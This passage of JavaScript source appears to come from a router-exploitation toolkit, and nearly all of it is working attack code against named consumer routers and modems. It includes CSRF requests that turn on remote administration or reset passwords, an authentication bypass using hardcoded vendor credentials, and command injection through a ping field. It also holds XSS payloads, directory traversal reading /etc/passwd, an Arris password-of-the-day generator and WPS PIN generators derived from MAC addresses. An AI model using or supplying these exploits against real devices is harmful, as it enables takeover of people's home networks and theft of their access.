      for (i = 0; i < len; i++) {
        password_of_the_day[i] = alphanum[list5[i]];
      }
      password_of_the_day = password_of_the_day.join('');
      alert('Arris cable modem password of the day: ' + password_of_the_day);
    }
  }
}



function DIR865L(ip){
	ip = ip || "192.168.0.1";
	loca = prompt("Path to XML files containing PHP code for execution\n../../tmp/storage/<sharename>/FILE")
	document.location="http://"+ip+"/router_info.xml?section="+loca;
}


function WR1043ND(ip){
	ip = ip || "192.168.0.1";
	alert("Making Root FS Accessible to FTP");
	img1.src="http://"+ip+"/userRpm/NasFtpCfgRpm.htm?displayName=RootTraversal&shareEntire=%2F&Save=Save&selPage=0&Page=1&subpage=2";
	alert("Enabling FTP on the WAN Interface");
	img1.src="http://"+ip+"/userRpm/NasFtpCfgRpm.htm?internetA=1&service_port=21&save=Save";
	alert("Enabling Remote Management");
	img1.src="http://"+ip+"/userRpm/ManageControlRpm.htm?port=80&ip=255.255.255.255&Save=Save";
	alert("Change FTP Admin User Password");
	img1.src="http://"+ip+"/userRpm/NasUserAdvRpm.htm?nas_admin_pwd=ISE&nas_admin_confirm_pwd=ISE&nas_admin_authority=1&nas_admin_ftp=1&Modify=0&Save=Save";
	alert("Enabling FTP Server");
	img1.src="http://"+ip+"/userRpm/NasFtpCfgRpm.htm?startFtp=1";
}

function N900_csrf(ip){
	ip = ip || "192.168.2.1";
form = '<input name="page" value="util_system"/>\
<input name="sHr" value="00"/>\
<input name="Mm" value="00"/>\
<input name="eHr" value="00"/>\
<input name="eMm" value="00"/>\
<input name="RemoteIP" value="..."/>\
<input name="passwd_md5" value="5f4dcc3b5aa765d61d8327deb882cf99"/>\
<input name="do_save_passwd_md5" value="1"/>\
<input name="login_timeout" value="99"/>\
<input name="EnableRgmt" value="1"/>\
<input name="checkremote" value="1"/>\
<input name="http_wanport" value="31337"/>\
<input name="EnableUPNP" value="1"/>\
<input name="version_eb" value="0"/>';
	post('http://' + ip + '/util_system.html', form);
}

function F5D8236_4v2_csrf_admin(ip){
	ip = ip || "192.168.2.1";
	form = '<input type="hidden" name="remote_mgmt_enabled" value="1"/>\
	<input type="hidden" name="remote_mgmt_port" value="31337"/>\
	<input type="hidden" name="allow_remote_ip" value="0">';
	post('http://' + ip + '/cgi bin/system_setting.exe', form);
}


function N300_csrf_admin(ip){
	ip = ip || "192.168.2.1";
	form = '<input type="hidden" name="location_page" value="system.stm"/>\
	<input type="hidden" name="remote_mgmt_enabled" value="1"/>\
	<input type="hidden" name="http_passwd" value=""/>\
	<input type="hidden" name="fw_disable" value="0"/>\
	<input type="hidden" name="EnableRgmt" value="on"/>\
	<input type="hidden" name="allow_remote_ip" value="0"/>\
	<input type="hidden" name="http_wanport" value="31337"/>\
	<input type="hidden" name="arc_action" value="Apply+Changes"/>';
	post('http://' + ip + '/apply.cgi', form);
}

function httpGet(url)
{
            var http = new XMLHttpRequest(); 
            http.open("GET", url, true);             
            http.onreadystatechange = function() {};
            http.send(null);
}

//Zoom X4 and X5 ADSL Modem and Router - New Admin Username - js by sinnet3000
function zoomX_newadmin(ip)
{
    ip = ip || "10.0.0.2";
    var username = prompt("New username")
    var password = prompt("New password:");
    
    urlv1 ='/emweb/PopOutUserAdd.htm?id=70&user_id="' + username + '"&priv=v2&pass1="' + password +'"&pass2="' + password +'"&cmdSubmit=Save+Changes'
	urlv2 = '/emweb/PopOutUserAdd.htm?id=70&Zadv=1&ex_param1=adminuser_id="' + username + '"&priv=v1&pass1="' + password +'"&pass2="' + password +'"&cmdSubmit=Save+Changes'
    httpGet(urlv1);
    httpGet(urlv2);
}



// Alcatel Lucent I-240W-Q Authentication Bypass - js by sinnet3000
function i230w_auth(ip)
{
	ip = ip || "192.168.1.254";
	form = '<input value="index" name="XWebPageName" />\
	<input value="telecomadmin" name="username" />\
	<input value="nE7jA%5m" name="password" />';
	post('http://' + ip + '/GponForm/LoginForm', form);
}

// Alcatel Lucent I-240W-Q - Command Execution
function i240w_command(ip)
{

	ip = ip || "192.168.1.254";

	cmd = prompt("Command:");
	i230w_auth(ip);
	form = '<input value="index" name="XWebPageName" value="diag" />\
	<input value="index" name="diag_action" value="ping" />\
	<input value="index" name="wan_conlist" value="0" />\
	<input value="index" name="dest_host" value="%3B'+ encodeURI(cmd) + '"/>' ;
	post('http://' + ip + '/GponForm/diag_XForm', form);
}

function N900_xss_psk(ip)
{
	ip = ip || "192.168.2.1";
	form = '<input name="page" value="wl_guest">\
<input name="radio" value="1">\
<input name="wl_guest_mode" value="1">\
<input name="ssid" value="belkin.c86.guests">\
<input name="guest_psk" value="<img+src%3D"42"+onerror%3D"alert(42)">"';
	post('http://' + ip + '	/wl_guest.html', form);
}

function N900_xss_ssid(ip)
{
	ip = ip || "192.168.2.1";
	xss = prompt("XSS:")
	form = '<input name="page" value="wl_channel">\
	<input name="wchan1" value="0">\
	<input name="ssid1" value="belkin.c86">\
	<input name="wbr1" value="9">\
	<input name="wl_nbw_cap1" value="0">\
	<input name="hidessid1" value="1">\
	<input name="protectmode1" value="0">\
	<input name="wmmenable1" value="1">\
	<input name="burstMode1" value="1">\
	<input name="wchan2" value="0">\
	<input name="ssid2" value="';
	form += xss;
	form += '">\
	<input name="wbr2" value="8">\
	<input name="wl_nbw_cap2" value="1">\
	<input name="hidessid2" value="1">\
	<input name="protectmode2" value="0">\
	<input name="wmmenable2" value="1">\
	<input name="burstMode2" value="1">';
	post('http://' + ip + '	/wl_chanel.html', form);
}

// Ubee Cablemas - Auth Bypass
function ubecablemas_bypass(ip)
{
	ip = ip || "192.168.1.1";
	var form = '<input	type="hidden"	name="loginUsername" value="operator"/>';
	form += '<input	type="hidden"	name="loginPassword"	value="cmoperator"/>';
	form += '</form>';
	post('http://' + ip + ':8080/goform/login', form);
}

// 2wire 4011G and 5012NV - Directory Traversal js by sinnet3000
function twowire4011g5012nv_dirtraversal(ip)
{
    ip = ip || "192.168.1.254";
    pathfile = prompt("Path :\n(Ex: /etc/passwd, /etc/serialno)");
    resource = '/pages/C_4_0.asp/../../..' + pathfile;
    form = '<input value="' + resource + '"name="__ENH_SHOW_REDIRECT_PATH__" />\
    <input value="Acceder" name="__ENH_SUBMIT_VALUE_SHOW__" />\
    <input value="" name="__ENH_SUBMIT_VALUE_SHOW__" />\
    <input value="tech" name="username" />';
    post('http://' + ip + '/goform/enhAuthHandler', form);
}

//ARRIS DG860A WPS PIN Generator by Justin Oberdorf - js by hkm
function ComputeChecksum(s){
	accum = 0
	s *= 10
	accum += 3 * ((parseInt(s / 10000000)) % 10)
	accum += 1 * ((parseInt(s / 1000000)) % 10)
	accum += 3 * ((parseInt(s / 100000)) % 10)
	accum += 1 * ((parseInt(s / 10000)) % 10)
	accum += 3 * ((parseInt(s / 1000)) % 10)
	accum += 1 * ((parseInt(s / 100)) % 10)
	accum += 3 * ((parseInt(s / 10)) % 10)

	digit = (accum % 10)
	return (10 - digit) % 10
}

function F(n)
{
if (n==1 || n==2 || n==0){
        return 1;
     } else{
      return F(n-1) + F(n-2);
    }
}

function FibGen(num){
	return F(num);
}
function DG860A_wps_gen(strMac){

	fibnum = new Array(6)
	fibsum=0;
	seed=16
	count=1
	offset=0
	counter=0

q=prompt("MAC:");
q = q.replace(/:/g,'');
a=0
arrayMacs = new Array();
var tmp = new Array();

for (c=0;c<13;c+=2) {
   arrayMacs[a]=parseInt(q.charAt(c)+q.charAt(c+1), 16);
   tmp[a]=parseInt(q.charAt(c)+q.charAt(c+1), 16);
	a=a+1
}

	for (i=0;i<6;i++){
		if (tmp[i] > 30) {
			while (tmp[i] > 31){
				tmp[i] -= 16
				counter += 1
			}
		}
		if (counter == 0){
			if (tmp[i] < 3) {
				tmp[i] = tmp[0]+tmp[1]+tmp[2]+tmp[3]+tmp[4]+tmp[5]-tmp[i]
				if (tmp[i] > 0xff){
					tmp[i] = tmp[i] & 0xff
				}
				tmp[i] = (tmp[i]%28) + 3
			}

			fibnum[i] = FibGen(tmp[i])
		}else{
			fibnum[i] = FibGen(tmp[i])+FibGen(counter)
		}
		counter = 0
	}

    for (i=0;i<6;i++){

		fibsum += (fibnum[i]*FibGen(i+seed))+arrayMacs[i]
	}
	fibsum = fibsum%10000000
	checksum = ComputeChecksum(fibsum)
	fibsum = (fibsum*10) + checksum
	alert("WPS: "+String(fibsum))
}

/*

Belkin F5D8235-4 v1000, F5D8231-4 v5000, F9K1104 v1000 - WPS from MAC Address

Belkin_N+_XXXXXX   00:22:75:XX:XX:XX    F5D8235-4 v1000
belkin.XXX         00:1C:DF:XX:XX:XX    F5D8231-4 v5000
belkin.XXX         09:86:3B:XX:XX:XX    F9K1104   v1000

@author         : e.novellalorente@student.ru.nl
Original work   : ZhaoChunsheng 04/07/2012
Javascript Port : @sinnet3000
Requires: Long.js

Advisory: http://ednolo.alumnos.upv.es/?p=1295

*/

function belkinwpspin()
{
	var Long = dcodeIO.Long;
	var mac = prompt("Enter the last 6 digits of the MAC Address (Ex: 51990C): ");
	var pin = new Long(Long.fromString(mac, 16));
	pin = pin.modulo(Long.fromNumber(10000000));
	var accum = new Long(Long.fromNumber(0));

	var temp = new Long(Long.fromNumber(0));
	var temp2 = new Long(Long.fromNumber(0));
	
	while(pin.toNumber()) {
		temp = pin.modulo(Long.fromNumber(10));
		temp2 = temp.multiply(Long.fromNumber(3));
		accum = accum.add(temp2);
		pin = pin.div(Long.fromNumber(10));
		temp = pin.modulo(Long.fromNumber(10));
		accum = accum.add(temp);
		pin = pin.div(Long.fromNumber(10));
	}
	temp = accum.modulo(Long.fromNumber(10));
	temp2 = Long.fromNumber(10).subtract(temp);
	accum = temp2.modulo(Long.fromNumber(10));

    alert(parseInt(mac, 16) + accum.toString());

}
